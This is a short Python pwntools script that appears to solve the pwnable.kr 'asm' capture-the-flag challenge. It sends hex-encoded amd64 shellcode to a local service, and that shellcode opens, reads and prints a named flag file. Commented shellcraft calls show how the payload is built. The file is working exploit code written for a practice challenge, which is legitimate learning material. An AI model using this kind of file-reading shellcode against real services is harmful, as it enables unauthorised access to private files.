from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

filename='this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\0'

cn = remote('0.0.0.0',9026)
#cn = process('./asm')
cn.recvuntil('shellcode: ')

#p_filename = 0x41414700
#p_flag = 0x41414800
#pay=''
#pay += asm(shellcraft.amd64.linux.syscall('SYS_read',0,p_filename,0x100))
#pay += asm(shellcraft.amd64.linux.syscall('SYS_open',p_filename,0,0x400))
#pay += asm(shellcraft.amd64.linux.syscall('SYS_read','rax',p_flag,0x200))
#pay += asm(shellcraft.amd64.linux.syscall('SYS_write',1,p_flag,0x300))
pay = '31c031ff31d2b601be0101010181f6014640400f056a0258bf0101010181f70146404031d2b60431f60f054889c731c031d2b602be0101010181f6014940400f056a01586a015f31d2b603be0101010181f6014940400f05'.decode('hex')
#print pay.encode('hex')

cn.send(pay)
cn.send(filename)
print cn.recvuntil('\x90')